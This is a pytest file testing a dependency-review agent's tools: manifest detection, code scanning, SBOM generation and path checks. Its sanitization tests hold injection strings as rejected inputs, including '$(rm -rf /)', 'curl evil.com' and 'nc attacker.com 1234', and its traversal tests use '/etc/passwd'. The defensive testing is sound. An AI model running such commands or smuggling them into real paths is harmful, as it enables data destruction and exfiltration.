"""Tests for agent tool definitions.
# tested-by: tests/unit/test_agent_tools.py
"""

from __future__ import annotations

from datetime import UTC
from unittest.mock import patch

import pytest

pytest.importorskip("agent_framework", reason="agent_framework not installed (eedom[copilot])")

from eedom.core.models import (
    DecisionVerdict,
    OperatingMode,
    PolicyEvaluation,
    RequestType,
    ReviewDecision,
    ReviewRequest,
    ScanResult,
    ScanResultStatus,
)


def _make_decision(verdict: DecisionVerdict = DecisionVerdict.approve) -> ReviewDecision:
    """Build a minimal ReviewDecision for testing."""
    from datetime import datetime
    from uuid import uuid4

    req = ReviewRequest(
        request_id=uuid4(),
        request_type=RequestType.new_package,
        ecosystem="pypi",
        package_name="requests",
        target_version="2.31.0",
        team="platform",
        pr_url="https://github.com/org/repo/pull/1",
        operating_mode=OperatingMode.advise,
        created_at=datetime.now(tz=UTC),
    )
    pol = PolicyEvaluation(
        decision=verdict,
        triggered_rules=[],
        policy_bundle_version="1.0.0",
    )
    scan = ScanResult(
        tool_name="osv-scanner",
        status=ScanResultStatus.success,
        findings=[],
        duration_seconds=1.5,
    )
    return ReviewDecision(
        decision_id=uuid4(),
        request=req,
        decision=verdict,
        findings=[],
        scan_results=[scan],
        policy_evaluation=pol,
        pipeline_duration_seconds=3.0,
        created_at=datetime.now(tz=UTC),
    )


class TestEvaluateChange:
    def test_returns_decisions_for_valid_diff(self):
        from eedom.agent.tools import evaluate_change

        decision = _make_decision(DecisionVerdict.approve)
        with patch(
            "eedom.agent.tools.run_pipeline",
            return_value=([decision], [], {}),
        ):
            result = evaluate_change(
                diff_text="diff --git a/requirements.txt\n+requests==2.31.0",
                pr_url="https://github.com/org/repo/pull/1",
                team="platform",
                repo_path="./test_repo",
            )
        assert result["status"] == "ok"
        assert len(result["decisions"]) == 1
        assert result["decisions"][0]["package_name"] == "requests"

    def test_returns_empty_for_no_dependency_changes(self):
        from eedom.agent.tools import evaluate_change

        with patch(
            "eedom.agent.tools.run_pipeline",
            return_value=([], [], {}),
        ):
            result = evaluate_change(
                diff_text="diff --git a/README.md\n+hello",
                pr_url="https://github.com/org/repo/pull/1",
                team="platform",
                repo_path="./test_repo",
            )
        assert result["status"] == "ok"
        assert result["decisions"] == []

    def test_handles_pipeline_timeout(self):
        from eedom.agent.tools import evaluate_change

        with patch(
            "eedom.agent.tools.run_pipeline",
            side_effect=TimeoutError("pipeline timeout"),
        ):
            result = evaluate_change(
                diff_text="diff --git a/requirements.txt\n+requests==2.31.0",
                pr_url="https://github.com/org/repo/pull/1",
                team="platform",
                repo_path="./test_repo",
            )
        assert result["status"] == "error"
        assert result["error"] == "pipeline_timeout"

    def test_handles_unexpected_exception(self):
        from eedom.agent.tools import evaluate_change

        with patch(
            "eedom.agent.tools.run_pipeline",
            side_effect=RuntimeError("unexpected"),
        ):
            result = evaluate_change(
                diff_text="diff",
                pr_url="https://github.com/org/repo/pull/1",
                team="platform",
                repo_path="./test_repo",
            )
        assert result["status"] == "error"
        assert result["error"] == "pipeline_unavailable"


class TestManifestDetection:
    def test_detects_python_manifests(self):
        from eedom.agent.tool_helpers import (
            detect_manifest_changes as _detect_manifest_changes,
        )

        diff = "diff --git a/requirements.txt b/requirements.txt\n+requests==2.31.0\n"
        result = _detect_manifest_changes(diff)
        assert "pypi" in result
        assert "requirements.txt" in result["pypi"]

    def test_detects_npm_manifests(self):
        from eedom.agent.tool_helpers import (
            detect_manifest_changes as _detect_manifest_changes,
        )

        diff = (
            "diff --git a/package.json b/package.json\n+new dep\n"
            "diff --git a/yarn.lock b/yarn.lock\n+lock entry\n"
        )
        result = _detect_manifest_changes(diff)
        assert "npm" in result
        assert len(result["npm"]) == 2

    def test_detects_cargo_manifests(self):
        from eedom.agent.tool_helpers import (
            detect_manifest_changes as _detect_manifest_changes,
        )

        diff = 'diff --git a/Cargo.toml b/Cargo.toml\n+serde = "1.0"\n'
        result = _detect_manifest_changes(diff)
        assert "cargo" in result

    def test_detects_go_manifests(self):
        from eedom.agent.tool_helpers import (
            detect_manifest_changes as _detect_manifest_changes,
        )

        diff = "diff --git a/go.mod b/go.mod\n+require github.com/foo/bar v1.0.0\n"
        result = _detect_manifest_changes(diff)
        assert "golang" in result

    def test_detects_mixed_ecosystems(self):
        from eedom.agent.tool_helpers import (
            detect_manifest_changes as _detect_manifest_changes,
        )

        diff = (
            "diff --git a/requirements.txt b/requirements.txt\n+flask\n"
            "diff --git a/package.json b/package.json\n+react\n"
            "diff --git a/Cargo.toml b/Cargo.toml\n+tokio\n"
        )
        result = _detect_manifest_changes(diff)
        assert "pypi" in result
        assert "npm" in result
        assert "cargo" in result

    def test_ignores_non_manifest_files(self):
        from eedom.agent.tool_helpers import (
            detect_manifest_changes as _detect_manifest_changes,
        )

        diff = "diff --git a/README.md b/README.md\n+hello\n"
        result = _detect_manifest_changes(diff)
        assert result == {}

    def test_detects_ruby_gemfile(self):
        from eedom.agent.tool_helpers import (
            detect_manifest_changes as _detect_manifest_changes,
        )

        diff = "diff --git a/Gemfile b/Gemfile\n+gem 'rails'\n"
        result = _detect_manifest_changes(diff)
        assert "gem" in result

    def test_detects_composer_json(self):
        from eedom.agent.tool_helpers import (
            detect_manifest_changes as _detect_manifest_changes,
        )

        diff = "diff --git a/composer.json b/composer.json\n+dep\n"
        result = _detect_manifest_changes(diff)
        assert "composer" in result

    def test_detects_mix_exs(self):
        from eedom.agent.tool_helpers import (
            detect_manifest_changes as _detect_manifest_changes,
        )

        diff = 'diff --git a/mix.exs b/mix.exs\n+{:phoenix, "~> 1.7"}\n'
        result = _detect_manifest_changes(diff)
        assert "hex" in result


class TestCheckPackage:
    def test_returns_policy_evaluation(self):
        from eedom.agent.tools import check_package

        decision = _make_decision(DecisionVerdict.approve)
        with patch(
            "eedom.agent.tools.run_pipeline",
            return_value=([decision], [], {}),
        ):
            result = check_package(
                name="requests",
                version="2.31.0",
                ecosystem="pypi",
            )
        assert result["status"] == "ok"
        assert result["decision"] == "approve"

    def test_handles_missing_package(self):
        from eedom.agent.tools import check_package

        with patch(
            "eedom.agent.tools.run_pipeline",
            return_value=([], [], {}),
        ):
            result = check_package(
                name="nonexistent-pkg",
                version="0.0.1",
                ecosystem="pypi",
            )
        assert result["status"] == "ok"
        assert result["decision"] == "no_findings"

    def test_rejects_invalid_name(self):
        from eedom.agent.tools import check_package

        result = check_package(
            name="evil\ndiff --git",
            version="1.0.0",
            ecosystem="pypi",
        )
        assert result["status"] == "error"
        assert result["error"] == "invalid_input"


class TestScanCode:
    @pytest.fixture(autouse=True)
    def _set_env(self, monkeypatch):
        monkeypatch.setenv("GATEKEEPER_GITHUB_TOKEN", "ghp_test")
        from eedom.agent.tool_helpers import get_agent_settings

        get_agent_settings.cache_clear()

    def test_returns_categorized_findings(self):
        from unittest.mock import MagicMock

        from eedom.agent.tools import scan_code
        from eedom.core.plugin import PluginResult

        mock_result = PluginResult(
            plugin_name="semgrep",
            findings=[
                {
                    "rule_id": "python.security.eval-injection",
                    "file": "app.py",
                    "start_line": 10,
                    "end_line": 10,
                    "severity": "ERROR",
                    "message": "Detected eval() usage",
                }
            ],
        )
        mock_plugin = MagicMock()
        mock_plugin.run.return_value = mock_result
        mock_registry = MagicMock()
        mock_registry.get.return_value = mock_plugin

        with patch(
            "eedom.agent.tools.get_default_registry",
            return_value=mock_registry,
        ):
            result = scan_code(
                diff_text="diff --git a/app.py b/app.py\n--- a/app.py\n+++ b/app.py\n@@ -1 +1 @@\n+eval(user_input)",
                repo_path=".",
            )
        assert result["status"] == "ok"
        assert len(result["findings"]) == 1
        assert result["findings"][0]["rule_id"] == "python.security.eval-injection"
        assert result["findings"][0]["severity"] == "ERROR"

    def test_returns_empty_for_clean_code(self):
        from unittest.mock import MagicMock

        from eedom.agent.tools import scan_code
        from eedom.core.plugin import PluginResult

        mock_plugin = MagicMock()
        mock_plugin.run.return_value = PluginResult(plugin_name="semgrep", findings=[])
        mock_registry = MagicMock()
        mock_registry.get.return_value = mock_plugin

        with patch(
            "eedom.agent.tools.get_default_registry",
            return_value=mock_registry,
        ):
            result = scan_code(
                diff_text="diff --git a/app.py b/app.py\n--- a/app.py\n+++ b/app.py\n@@ -1 +1 @@\n+x = 1",
                repo_path=".",
            )
        assert result["status"] == "ok"
        assert result["findings"] == []

    def test_handles_semgrep_timeout(self):
        from unittest.mock import MagicMock

        from eedom.agent.tools import scan_code
        from eedom.core.plugin import PluginResult

        mock_plugin = MagicMock()
        mock_plugin.run.return_value = PluginResult(
            plugin_name="semgrep",
            error="Command 'semgrep' timed out after 120 seconds",
        )
        mock_registry = MagicMock()
        mock_registry.get.return_value = mock_plugin

        with patch(
            "eedom.agent.tools.get_default_registry",
            return_value=mock_registry,
        ):
            result = scan_code(
                diff_text="diff --git a/app.py b/app.py\n--- a/app.py\n+++ b/app.py\n@@ -1 +1 @@\n+x = 1",
                repo_path=".",
            )
        assert result["status"] == "error"
        assert "timeout" in result["error"].lower()

    def test_handles_semgrep_not_installed(self):
        from unittest.mock import MagicMock

        from eedom.agent.tools import scan_code
        from eedom.core.plugin import PluginResult

        mock_plugin = MagicMock()
        mock_plugin.run.return_value = PluginResult(
            plugin_name="semgrep",
            error="[Errno 2] No such file or directory: 'semgrep'",
        )
        mock_registry = MagicMock()
        mock_registry.get.return_value = mock_plugin

        with patch(
            "eedom.agent.tools.get_default_registry",
            return_value=mock_registry,
        ):
            result = scan_code(
                diff_text="diff --git a/app.py b/app.py\n--- a/app.py\n+++ b/app.py\n@@ -1 +1 @@\n+x = 1",
                repo_path=".",
            )
        assert result["status"] == "error"
        assert "not_installed" in result["error"]

    def test_attaches_enrichment_when_source_available(self, tmp_path, monkeypatch):
        """scan_code findings carry detect-then-enrich context (ADR-006)."""
        from unittest.mock import MagicMock

        from eedom.agent.tools import scan_code
        from eedom.core.plugin import PluginResult

        (tmp_path / "app.py").write_text("def handler():\n    eval(x)\n    return 1\n")
        monkeypatch.setenv("EEDOM_GRAPH_DB", str(tmp_path / "graph.db"))

        mock_result = PluginResult(
            plugin_name="semgrep",
            findings=[
                {
                    "rule_id": "python.security.eval-injection",
                    "file": "app.py",
                    "start_line": 2,
                    "end_line": 2,
                    "severity": "ERROR",
                    "message": "Detected eval() usage",
                }
            ],
        )
        mock_plugin = MagicMock()
        mock_plugin.run.return_value = mock_result
        mock_registry = MagicMock()
        mock_registry.get.return_value = mock_plugin

        with patch(
            "eedom.agent.tools.get_default_registry",
            return_value=mock_registry,
        ):
            result = scan_code(
                diff_text="diff --git a/app.py b/app.py\n--- a/app.py\n+++ b/app.py\n@@ -1 +2 @@\n+eval(x)",
                repo_path=str(tmp_path),
            )
        assert result["status"] == "ok"
        enrichment = result["findings"][0]["metadata"]["enrichment"]
        assert enrichment["enclosing_symbol"] == "handler"
        assert "enclosing_symbol" in enrichment["sources"]

    def test_only_scans_changed_files(self):
        from eedom.agent.tool_helpers import (
            extract_changed_files as _extract_changed_files,
        )

        diff_text = (
            "diff --git a/src/app.py b/src/app.py\n"
            "--- a/src/app.py\n"
            "+++ b/src/app.py\n"
            "@@ -1 +1 @@\n"
            "+new line\n"
            "diff --git a/tests/test_app.py b/tests/test_app.py\n"
            "--- a/tests/test_app.py\n"
            "+++ b/tests/test_app.py\n"
            "@@ -1 +1 @@\n"
            "+new test\n"
        )
        files = _extract_changed_files(diff_text)
        assert files == ["src/app.py", "tests/test_app.py"]

    def test_skips_deleted_files(self):
        from eedom.agent.tool_helpers import (
            extract_changed_files as _extract_changed_files,
        )

        diff_text = (
            "diff --git a/deleted.py b/deleted.py\n"
            "--- a/deleted.py\n"
            "+++ /dev/null\n"
            "@@ -1 +0,0 @@\n"
            "-old line\n"
        )
        files = _extract_changed_files(diff_text)
        assert files == []

    def test_skips_deleted_file_with_mode_change(self):
        from eedom.agent.tool_helpers import (
            extract_changed_files as _extract_changed_files,
        )

        diff_text = (
            "diff --git a/deleted.py b/deleted.py\n"
            "old mode 100644\n"
            "new mode 000000\n"
            "deleted file mode 100644\n"
            "index abc1234..0000000\n"
            "--- a/deleted.py\n"
            "+++ /dev/null\n"
            "@@ -1 +0,0 @@\n"
            "-old line\n"
        )
        files = _extract_changed_files(diff_text)
        assert files == []


class TestPathSanitization:
    """Finding 1 — Command injection via unsafe diff-extracted paths.

    extract_changed_files and validate_paths must reject paths containing
    shell metacharacters so they can never be interpolated into subprocess
    commands downstream.
    """

    def test_extract_changed_files_rejects_shell_metacharacter_paths(self):
        """Paths with $(...) in the diff b/ header must not be returned."""
        from eedom.agent.tool_helpers import extract_changed_files

        malicious_diff = (
            "diff --git a/safe.txt b/$(rm -rf /)\n"
            "--- a/safe.txt\n"
            "+++ b/$(rm -rf /)\n"
            "@@ -1 +1 @@\n"
            "-old\n"
            "+new\n"
        )
        files = extract_changed_files(malicious_diff)
        dangerous = {";", "&", "|", "`", "$", "(", ")"}
        bad = [f for f in files if any(c in f for c in dangerous)]
        assert bad == [], f"Dangerous paths returned: {bad}"

    def test_validate_paths_rejects_shell_injection(self):
        """validate_paths must return empty list for all shell-injected paths."""
        from eedom.agent.tool_helpers import validate_paths

        malicious_paths = [
            "test.txt; rm -rf /",
            "test.txt && curl evil.com",
            "test.txt | nc attacker.com 1234",
            "test.txt`whoami`",
            "test.txt$(whoami)",
        ]
        safe_paths = validate_paths(malicious_paths, "/safe/repo")
        assert len(safe_paths) == 0, f"Expected no safe paths, got: {safe_paths}"


class TestGenerateBaseSbom:
    """Finding 2 — Race condition: git checkout modifies shared working tree.

    _generate_base_sbom must use 'git worktree add/remove' to create an
    isolated checkout rather than 'git checkout' which changes the shared
    working directory and races with concurrent operations.
    """

    def test_uses_worktree_not_checkout(self):
        """_generate_base_sbom must not call git checkout on the working tree."""
        from unittest.mock import MagicMock, patch

        from eedom.agent.tool_helpers import _generate_base_sbom

        def run_side_effect(*args, **kwargs):
            result = MagicMock()
            result.stdout = ""
            result.returncode = 0
            cmd = args[0] if args else []
            if isinstance(cmd, list) and "merge-base" in cmd:
                result.stdout = "abc123abc123\n"
            return result

        with (
            patch(
                "eedom.agent.tool_helpers.subprocess.run", side_effect=run_side_effect
            ) as mock_run,
            patch("eedom.agent.tool_helpers.run_syft", return_value={"components": []}),
        ):
            _generate_base_sbom("/fake/repo")

        calls = mock_run.call_args_list
        cmds = [c.args[0] for c in calls if c.args and isinstance(c.args[0], list)]
        checkout_calls = [cmd for cmd in cmds if "checkout" in cmd]
        worktree_calls = [cmd for cmd in cmds if "worktree" in cmd]

        assert (
            len(checkout_calls) == 0
        ), f"Must not use git checkout (race condition): {checkout_calls}"
        assert (
            len(worktree_calls) >= 2
        ), f"Expected worktree add+remove calls, found: {worktree_calls}"

    def test_worktree_cleaned_up_on_syft_failure(self):
        """The worktree must be removed via 'worktree remove' even if run_syft raises."""
        from unittest.mock import MagicMock, patch

        from eedom.agent.tool_helpers import _generate_base_sbom

        def run_side_effect(*args, **kwargs):
            result = MagicMock()
            result.stdout = ""
            result.returncode = 0
            cmd = args[0] if args else []
            if isinstance(cmd, list) and "merge-base" in cmd:
                result.stdout = "abc123abc123\n"
            return result

        with (
            patch(
                "eedom.agent.tool_helpers.subprocess.run", side_effect=run_side_effect
            ) as mock_run,
            patch(
                "eedom.agent.tool_helpers.run_syft",
                side_effect=RuntimeError("syft failed"),
            ),
        ):
            result = _generate_base_sbom("/fake/repo")

        assert result == {"components": []}, "Should return empty baseline on failure"
        calls = mock_run.call_args_list
        cmds = [c.args[0] for c in calls if c.args and isinstance(c.args[0], list)]
        remove_calls = [cmd for cmd in cmds if "worktree" in cmd and "remove" in cmd]
        assert (
            len(remove_calls) >= 1
        ), f"Worktree must be removed on failure, subprocess calls were: {cmds}"


class TestRunSyftPathValidation:
    """Patch 7 — run_syft must validate repo_path before calling subprocess."""

    def test_run_syft_rejects_nonexistent_path(self):
        """run_syft should raise ValueError for a non-existent repo_path."""
        from eedom.agent.tool_helpers import run_syft

        nonexistent_path = "/nonexistent/path/that/does/not/exist/12345"
        with pytest.raises(ValueError, match="repo_path does not exist"):
            run_syft(nonexistent_path)

    def test_run_syft_rejects_file_path(self, tmp_path):
        """run_syft should raise ValueError if repo_path is a file, not a directory."""
        from eedom.agent.tool_helpers import run_syft

        file_path = tmp_path / "test_file.txt"
        file_path.write_text("test content")

        with pytest.raises(ValueError, match="repo_path is not a directory"):
            run_syft(str(file_path))

    def test_run_syft_accepts_valid_directory(self, tmp_path):
        """run_syft should accept a valid directory and proceed to subprocess."""
        from unittest.mock import MagicMock, patch

        from eedom.agent.tool_helpers import run_syft

        repo_dir = tmp_path / "valid_repo"
        repo_dir.mkdir()

        mock_result = MagicMock()
        mock_result.stdout = '{"components": []}'

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            result = run_syft(str(repo_dir))

        mock_run.assert_called_once()
        call_args = mock_run.call_args[0][0]
        assert call_args[1] == f"dir:{repo_dir}"
        assert result == {"components": []}

    def test_run_syft_handles_symlink_to_directory(self, tmp_path):
        """run_syft should accept symlinks that point to directories."""
        from unittest.mock import MagicMock, patch

        from eedom.agent.tool_helpers import run_syft

        real_dir = tmp_path / "real_repo"
        real_dir.mkdir()
        symlink_dir = tmp_path / "symlink_repo"
        symlink_dir.symlink_to(real_dir)

        mock_result = MagicMock()
        mock_result.stdout = '{"components": []}'

        with patch("subprocess.run", return_value=mock_result) as mock_run:
            result = run_syft(str(symlink_dir))

        mock_run.assert_called_once()
        assert result == {"components": []}


class TestExtractChangedFilesEdgeCases:
    """Patch 9 — extract_changed_files must handle deleted binary files."""

    def test_renamed_file_is_extracted(self):
        """Renamed files should be included in the changed files list."""
        from eedom.agent.tool_helpers import extract_changed_files

        diff = (
            "diff --git a/old_name.py b/new_name.py\n"
            "similarity index 100%\n"
            "rename from old_name.py\n"
            "rename to new_name.py\n"
        )
        result = extract_changed_files(diff)
        assert result == ["new_name.py"]

    def test_binary_file_modification_is_extracted(self):
        """Binary files marked with 'Binary files ... differ' should be included."""
        from eedom.agent.tool_helpers import extract_changed_files

        diff = (
            "diff --git a/image.png b/image.png\nBinary files a/image.png and b/image.png differ\n"
        )
        result = extract_changed_files(diff)
        assert result == ["image.png"]

    def test_deleted_binary_file_is_not_extracted(self):
        """Deleted binary files (Binary files ... /dev/null differ) must be excluded."""
        from eedom.agent.tool_helpers import extract_changed_files

        diff = (
            "diff --git a/deleted.bin b/deleted.bin\n"
            "deleted file mode 100644\n"
            "Binary files a/deleted.bin and /dev/null differ\n"
        )
        result = extract_changed_files(diff)
        assert result == []

    def test_binary_file_with_mode_change_is_extracted(self):
        """Binary files with mode changes (but not deleted) should be extracted."""
        from eedom.agent.tool_helpers import extract_changed_files

        diff = (
            "diff --git a/script.sh b/script.sh\n"
            "old mode 100644\n"
            "new mode 100755\n"
            "Binary files a/script.sh and b/script.sh differ\n"
        )
        result = extract_changed_files(diff)
        assert result == ["script.sh"]

    def test_multiple_diffs_with_renames_and_binary(self):
        """Complex diff with rename, binary modification, and deleted file."""
        from eedom.agent.tool_helpers import extract_changed_files

        diff = (
            "diff --git a/old.py b/new.py\n"
            "similarity index 100%\n"
            "rename from old.py\n"
            "rename to new.py\n"
            "diff --git a/image.png b/image.png\n"
            "Binary files a/image.png and b/image.png differ\n"
            "diff --git a/deleted.txt b/deleted.txt\n"
            "deleted file mode 100644\n"
            "--- a/deleted.txt\n"
            "+++ /dev/null\n"
            "@@ -1 +0,0 @@\n"
            "-content\n"
        )
        result = extract_changed_files(diff)
        assert set(result) == {"new.py", "image.png"}


class TestRegistryRouting:
    """Verify that each scan tool routes through PluginRegistry, not direct runner imports.

    TDD: these tests are written FIRST and must fail before implementation.
    """

    @pytest.fixture(autouse=True)
    def _set_env(self, monkeypatch):
        """Satisfy AgentSettings validation present before refactor."""
        monkeypatch.setenv("GATEKEEPER_GITHUB_TOKEN", "ghp_test")
        from eedom.agent.tool_helpers import get_agent_settings

        get_agent_settings.cache_clear()

    _DIFF_PY = "diff --git a/app.py b/app.py\n--- a/app.py\n+++ b/app.py\n@@ -1 +1 @@\n+x = 1\n"
    _DIFF_YAML = (
        "diff --git a/deploy.yaml b/deploy.yaml\n"
        "--- a/deploy.yaml\n"
        "+++ b/deploy.yaml\n"
        "@@ -1 +1 @@\n"
        "+kind: Deployment\n"
    )

    def test_scan_code_routes_through_semgrep_plugin(self, monkeypatch):
        """scan_code must call registry.get('semgrep').run() — not run_semgrep() directly."""
        from unittest.mock import MagicMock

        from eedom.agent import tools
        from eedom.core.plugin import PluginResult

        mock_result = PluginResult(
            plugin_name="semgrep",
            findings=[
                {
                    "rule_id": "test.rule",
                    "file": "app.py",
                    "start_line": 1,
                    "end_line": 1,
                    "severity": "ERROR",
                    "message": "test finding",
                }
            ],
        )
        mock_plugin = MagicMock()
        mock_plugin.run.return_value = mock_result
        mock_registry = MagicMock()
        mock_registry.get.return_value = mock_plugin

        with patch(
            "eedom.agent.tools.get_default_registry",
            return_value=mock_registry,
            create=True,
        ):
            result = tools.scan_code(diff_text=self._DIFF_PY, repo_path=".")

        mock_registry.get.assert_called_once_with("semgrep")
        mock_plugin.run.assert_called_once()
        assert result["status"] == "ok"
        assert len(result["findings"]) == 1
        assert result["findings"][0]["rule_id"] == "test.rule"

    def test_scan_duplicates_routes_through_cpd_plugin(self, monkeypatch):
        """scan_duplicates must call registry.get('cpd').run() — not run_cpd() directly."""
        from unittest.mock import MagicMock

        from eedom.agent import tools
        from eedom.core.plugin import PluginResult

        mock_result = PluginResult(
            plugin_name="cpd",
            findings=[
                {
                    "tokens": 80,
                    "lines": 10,
                    "language": "python",
                    "locations": [],
                    "fragment": "",
                }
            ],
            summary={"total": 1, "files_scanned": 2},
        )
        mock_plugin = MagicMock()
        mock_plugin.run.return_value = mock_result
        mock_registry = MagicMock()
        mock_registry.get.return_value = mock_plugin

        with patch(
            "eedom.agent.tools.get_default_registry",
            return_value=mock_registry,
            create=True,
        ):
            result = tools.scan_duplicates(diff_text=self._DIFF_PY, repo_path=".")

        mock_registry.get.assert_called_once_with("cpd")
        mock_plugin.run.assert_called_once()
        assert result["status"] == "ok"
        assert len(result["duplicates"]) == 1

    def test_scan_k8s_routes_through_kube_linter_plugin(self, monkeypatch):
        """scan_k8s must call registry.get('kube-linter').run() — not run_kube_linter()."""
        from unittest.mock import MagicMock

        from eedom.agent import tools
        from eedom.core.plugin import PluginResult

        mock_result = PluginResult(
            plugin_name="kube-linter",
            findings=[
                {
                    "check": "no-read-only-root-fs",
                    "message": "container is missing readOnlyRootFilesystem",
                    "remediation": "Set readOnlyRootFilesystem: true",
                    "object_name": "my-deploy",
                    "object_kind": "Deployment",
                    "file": "deploy.yaml",
                }
            ],
            summary={"total": 1},
        )
        mock_plugin = MagicMock()
        mock_plugin.run.return_value = mock_result
        mock_registry = MagicMock()
        mock_registry.get.return_value = mock_plugin

        with patch(
            "eedom.agent.tools.get_default_registry",
            return_value=mock_registry,
            create=True,
        ):
            result = tools.scan_k8s(diff_text=self._DIFF_YAML, repo_path=".")

        mock_registry.get.assert_called_once_with("kube-linter")
        mock_plugin.run.assert_called_once()
        assert result["status"] == "ok"
        assert len(result["findings"]) == 1

    def test_analyze_complexity_routes_through_complexity_plugin(self, monkeypatch):
        """analyze_complexity must call registry.get('complexity').run() — not run_complexity()."""
        from unittest.mock import MagicMock

        from eedom.agent import tools
        from eedom.core.plugin import PluginResult

        mock_result = PluginResult(
            plugin_name="complexity",
            findings=[
                {
                    "function": "foo",
                    "file": "app.py",
                    "cyclomatic_complexity": 5,
                    "nloc": 20,
                    "maintainability_index": "A (85.0)",
                }
            ],
            summary={
                "avg_cyclomatic_complexity": 5.0,
                "max_cyclomatic_complexity": 5,
                "total_nloc": 20,
                "high_complexity_count": 0,
            },
        )
        mock_plugin = MagicMock()
        mock_plugin.run.return_value = mock_result
        mock_registry = MagicMock()
        mock_registry.get.return_value = mock_plugin

        with patch(
            "eedom.agent.tools.get_default_registry",
            return_value=mock_registry,
            create=True,
        ):
            result = tools.analyze_complexity(diff_text=self._DIFF_PY, repo_path=".")

        mock_registry.get.assert_called_once_with("complexity")
        mock_plugin.run.assert_called_once()
        assert result["status"] == "ok"
        assert len(result["functions"]) == 1
        assert result["functions"][0]["function"] == "foo"

    def test_scan_code_error_result_surfaces_error_status(self, monkeypatch):
        """When PluginResult.error is set, scan_code returns status='error'."""
        from unittest.mock import MagicMock

        from eedom.agent import tools
        from eedom.core.plugin import PluginResult

        mock_plugin = MagicMock()
        mock_plugin.run.return_value = PluginResult(
            plugin_name="semgrep",
            error="Command 'semgrep' timed out after 120 seconds",
        )
        mock_registry = MagicMock()
        mock_registry.get.return_value = mock_plugin

        with patch(
            "eedom.agent.tools.get_default_registry",
            return_value=mock_registry,
            create=True,
        ):
            result = tools.scan_code(diff_text=self._DIFF_PY, repo_path=".")

        assert result["status"] == "error"
        assert "timeout" in result["error"].lower()


class TestBuildDepSummaryPathTraversal:
    """CRITICAL: _build_dep_summary must reject path traversal in repo_path
    and sanitize component names from SBOM data.

    wave4-patch-4: Path traversal via unvalidated SBOM JSON paths.
    """

    def test_traversal_path_does_not_read_outside_repo(self, tmp_path):
        """Before fix: traversal reads sentinel dep from outside repo.
        After fix: returns {} without touching the sensitive directory.
        """
        import json as _json

        from eedom.agent.tools import _build_dep_summary

        # Sensitive dir has a package.json with a sentinel dep.
        sensitive = tmp_path / "sensitive"
        sensitive.mkdir()
        (sensitive / "package.json").write_text(
            _json.dumps({"dependencies": {"sentinel-evil-pkg": "9.9.9"}})
        )

        # The repo dir exists but has no package.json of its own.
        repo = tmp_path / "repo"
        repo.mkdir()

        # Construct a traversal path: repo/../sensitive  (not yet OS-resolved)
        traversal = str(repo) + "/../sensitive"

        raw_sbom = {"components": [], "dependencies": []}
        result = _build_dep_summary(raw_sbom, traversal)

        # After fix: must return {} without reading sensitive/package.json.
        # Before fix: reads it and includes "sentinel-evil-pkg" in direct.
        evil = [d for d in result.get("direct", []) if d["name"] == "sentinel-evil-pkg"]
        assert (
            evil == []
        ), f"Path traversal allowed reading 'sentinel-evil-pkg' from outside repo: {result}"

    def test_sbom_absolute_path_names_are_sanitized_in_shared(self, tmp_path):
        """SBOM component names that look like filesystem paths must not appear verbatim
        in the shared list.
        Before fix: '/etc/passwd' appears as-is in shared[].name.
        After fix: the value is sanitized (leading slash stripped).
        """
        from eedom.agent.tools import _build_dep_summary

        repo = tmp_path / "repo"
        repo.mkdir()

        # Build an SBOM where the evil component is depended on by 3+ packages
        # so it exceeds the shared threshold (count >= 3).
        raw_sbom = {
            "components": [
                {"purl": "pkg:npm/evil", "name": "/etc/passwd", "version": "1.0.0"},
                {"purl": "pkg:npm/p1", "name": "parent1", "version": "1.0.0"},
                {"purl": "pkg:npm/p2", "name": "parent2", "version": "1.0.0"},
                {"purl": "pkg:npm/p3", "name": "parent3", "version": "1.0.0"},
            ],
            "dependencies": [
                {"ref": "pkg:npm/p1", "dependsOn": ["pkg:npm/evil"]},
                {"ref": "pkg:npm/p2", "dependsOn": ["pkg:npm/evil"]},
                {"ref": "pkg:npm/p3", "dependsOn": ["pkg:npm/evil"]},
            ],
        }

        result = _build_dep_summary(raw_sbom, str(repo))

        # After fix: shared names must not start with "/" or contain "..".
        for item in result.get("shared", []):
            assert not item["name"].startswith(
                "/"
            ), f"Absolute path leaked into shared: {item['name']!r}"
            assert ".." not in item["name"], f"Traversal sequence in shared name: {item['name']!r}"
